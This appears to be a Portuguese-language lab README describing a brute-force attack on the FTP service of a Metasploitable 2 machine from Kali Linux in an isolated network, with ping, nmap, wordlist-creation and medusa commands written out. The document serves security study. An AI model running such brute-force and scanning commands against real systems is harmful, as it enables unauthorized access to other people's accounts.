# Ataque de Forca Bruta em FTP 

(Ambiente Controlado para Estudos)

Este repositório documenta um exercício de segurança ofensiva realizado em ambiente isolado, utilizando o Kali Linux para simular um ataque de força bruta ao serviço FTP da máquina Metasploitable 2.

## Objetivo

Demonstrar como credenciais fracas podem permitir acesso indevido via FTP e reforçar a importância de senhas seguras em ambientes de rede.

## Ambiente

- Máquina atacante: Kali Linux
- Máquina alvo: Metasploitable 2
- IP alvo: 192.168.56.103
- Rede: interno (Host-Only)

## Procedimento Executado

### 1. Verificação de comunicação com o alvo

ping -c 3 192.168.56.103

### 2. Scanner de portas

nmap -sV -p 1-500 192.168.56.103

### 3. Teste de conexão FTP

ftp 192.168.56.103

### 4. Criação de lista de usuários

echo -e "usuario1\nusuario2" > users.txt

### 5. Criação de lista de senhas

echo -e "senha1\nsenha2" > pass.txt

### 6. Execução do ataque

medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6

